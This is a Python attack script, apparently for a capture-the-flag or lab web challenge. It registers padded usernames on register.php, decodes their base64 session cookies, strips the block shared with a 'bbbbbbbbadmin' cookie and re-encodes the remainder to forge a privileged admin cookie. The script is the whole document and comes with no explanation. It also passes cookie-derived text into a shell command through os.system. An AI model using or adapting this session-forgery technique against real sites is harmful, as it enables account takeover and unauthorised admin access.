import requests
import binascii
import urllib
import base64
from binascii import unhexlify
import re
import os

url = ""

#define data to send and register users
data1 = {'username':'toast','password':'123456','password_again':'123456'}
data2 = {'username':'bbbbbbbb','password':'123456','password_again':'123456'}
data3 = {'username':'bbbbbbbbadmin','password':'123456','password_again':'123456'}

# register users
print('[*] Creating users . . . ')
url_reg = url + "register.php"
s = requests.Session()
s.post(url_reg, data1)
s.post(url_reg, data2)
s.post(url_reg, data3)

print('[*] Done!')

# login and retrieve auth cookie
url_login = url + "login.php"

data1 = {'username':'toast','password':'123456'}
data2 = {'username':'bbbbbbbb','password':'123456'}
data3 = {'username':'bbbbbbbbadmin','password':'123456'}
cookie = ""
b64 = ""

print('[*] Login and retrieve base64 auth cookies')
print(' ')
x = requests.Session()

# GET COOKIES, DECODE B64, FORMAT HEX
x.post(url_login, data1)
cookie = urllib.parse.unquote(str(x.cookies.get_dict()))
b64 = cookie.split("'")
b64 = b64[3]
b64 = str(base64.b64decode(b64).hex())
b64 = r"\x" + r"\x".join(b64[n : n+2] for n in range(0, len(b64), 2))
print("toast user: " + cookie)
print("toast user: " + b64)
print(" ")


x.post(url_login, data2)
cookie = urllib.parse.unquote(str(x.cookies.get_dict()))
b64 = cookie.split("'")
b64 = b64[3]
b64 = str(base64.b64decode(b64).hex())
b64 = r"\x" + r"\x".join(b64[n : n+2] for n in range(0, len(b64), 2))
b64_bbbbbbbb = b64
print("bbbbbbbb user: " + cookie)
print("bbbbbbbb user: " + b64)
print(" ")


x.post(url_login, data3)
cookie = urllib.parse.unquote(str(x.cookies.get_dict()))
b64 = cookie.split("'")
b64 = b64[3]
b64 = str(base64.b64decode(b64).hex())
b64 = r"\x" + r"\x".join(b64[n : n+2] for n in range(0, len(b64), 2))
b64_bbbbbbbbadmin = b64
print("bbbbbbbbadmin user: " + cookie)
print("bbbbbbbbadmin user: " + b64)
print(' ')

print("[*] Match found! ")
detected_match = ""

for x, y in zip(b64_bbbbbbbbadmin, b64_bbbbbbbb):
    if x == y:
        if (x == "x") or (x == "\\"):
            pass
        else:
            detected_match = detected_match + x

detected_match = r"\x" + r"\x".join(detected_match[n : n+2] for n in range(0, len(detected_match), 2))
print(detected_match)

final = b64_bbbbbbbbadmin.replace(detected_match,'')
#print(final)
print("[!] Generate privileged cookie . . .")

cmd = 'echo "' + final + '" | base64'
#cmd = 'echo  "' + final + '"'
os.system(cmd)
